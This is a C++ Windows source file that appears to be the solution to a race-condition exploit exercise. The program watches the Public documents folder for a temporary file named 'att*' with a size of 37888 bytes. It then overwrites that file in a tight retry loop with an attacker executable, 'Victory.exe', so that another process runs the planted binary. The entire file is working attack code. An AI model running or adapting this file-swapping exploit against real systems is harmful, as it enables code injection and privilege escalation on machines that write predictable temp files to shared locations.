// Solution.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#define TEMP_FILE_TEMPLATE TEXT("att*")
#define ATTACK_FILE TEXT("C:\\temp\\dist\\Victory.exe")

LPTSTR findTargetFile(LPTSTR dir);

int _tmain()
{
	LPTSTR pTargetPath = NULL;

	DWORD dwWaitStatus;
	HANDLE dwChangeHandle = INVALID_HANDLE_VALUE;;

	LPTSTR lpDir = TEXT("C:\\Documents and Settings\\Public");
	LPTSTR injectionFile = ATTACK_FILE;

	TCHAR target_file_path[MAX_PATH] = { 0 };


	// Watch the directory for file creation and deletion. 

	dwChangeHandle = FindFirstChangeNotification(
		lpDir,                         // directory to watch 
		FALSE,                         // do not watch subtree 
		FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_SIZE); // watch file name changes 

	if (dwChangeHandle == INVALID_HANDLE_VALUE)
	{
		printf("\n ERROR: FindFirstChangeNotification function failed.\n");
		ExitProcess(GetLastError());
	}

	// Change notification is set. Now wait on both notification 
	// handles and refresh accordingly. 

	while (TRUE)
	{
		// Wait for notification.

		printf("\nWaiting for notification...\n");

		dwWaitStatus = WaitForSingleObject(dwChangeHandle,
			INFINITE);

		switch (dwWaitStatus)
		{
		case WAIT_OBJECT_0:

			//something happened
			pTargetPath = findTargetFile(lpDir);
			if (NULL == pTargetPath) { //Wrong file, try again
				if (FindNextChangeNotification(dwChangeHandle) == FALSE)
				{
					printf("\n ERROR: FindNextChangeNotification function failed.\n");
					FindCloseChangeNotification(dwChangeHandle);
					ExitProcess(GetLastError());
				}
				break;
			}
			//got right file
			StringCchPrintf(target_file_path,sizeof(target_file_path), TEXT("%s\\%s"), lpDir, pTargetPath);
			//Now try to delete it quickly and replace it with something else
			while (!CopyFile(injectionFile, target_file_path,FALSE))
			{
				printf("trying again - Failed due to %d\n",GetLastError());
			}
			printf("Copied file!\n");
			//Success
			FindCloseChangeNotification(dwChangeHandle);
			ExitProcess(0);
			break;

		case WAIT_OBJECT_0 + 1:

			// A directory was created, renamed, or deleted.
			// Refresh the tree and restart the notification.

			if (FindNextChangeNotification(dwChangeHandle) == FALSE)
			{
				printf("\n ERROR: FindNextChangeNotification function failed.\n");
				FindCloseChangeNotification(dwChangeHandle);
				ExitProcess(GetLastError());
			}
			break;

		case WAIT_TIMEOUT:

			// A timeout occurred, this would happen if some value other 
			// than INFINITE is used in the Wait call and no changes occur.
			// In a single-threaded environment you might not want an
			// INFINITE wait.

			printf("\nNo changes in the timeout period.\n");
			break;

		default:
			printf("\n ERROR: Unhandled dwWaitStatus.\n");
			FindCloseChangeNotification(dwChangeHandle);
			ExitProcess(GetLastError());
			break;
		}
	}

	FindCloseChangeNotification(dwChangeHandle);

    return 0;
}

LPTSTR findTargetFile(LPTSTR dir) {
	HANDLE hFind = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA FindFileData = { 0 };
	TCHAR szTargetPattern[MAX_PATH] = { 0 };
	DWORD cbTargetFilePath = 0;
	LPTSTR pTargetPath = NULL;

	StringCchPrintf(szTargetPattern, MAX_PATH, TEXT("%s\\%s"), dir, TEMP_FILE_TEMPLATE);
	_tprintf(TEXT("Target path is %s\n"), szTargetPattern);

	hFind = FindFirstFile(szTargetPattern, &FindFileData);

	if (hFind == INVALID_HANDLE_VALUE)
	{
		printf("FindFirstFile failed (%d)\n", GetLastError());
		return NULL;
	}
	else
	{
		_tprintf(TEXT("The first file found is %s\n"),
			FindFileData.cFileName);
		//Check if it's the file we want.
		if (37888 != FindFileData.nFileSizeLow) { //Wrong file
			FindClose(hFind);
			return NULL;
		}
		//Lets guess we have the right file
		cbTargetFilePath = _tcslen(FindFileData.cFileName);
		pTargetPath = _wcsdup(FindFileData.cFileName);

		FindClose(hFind);
		return pTargetPath;
	}

}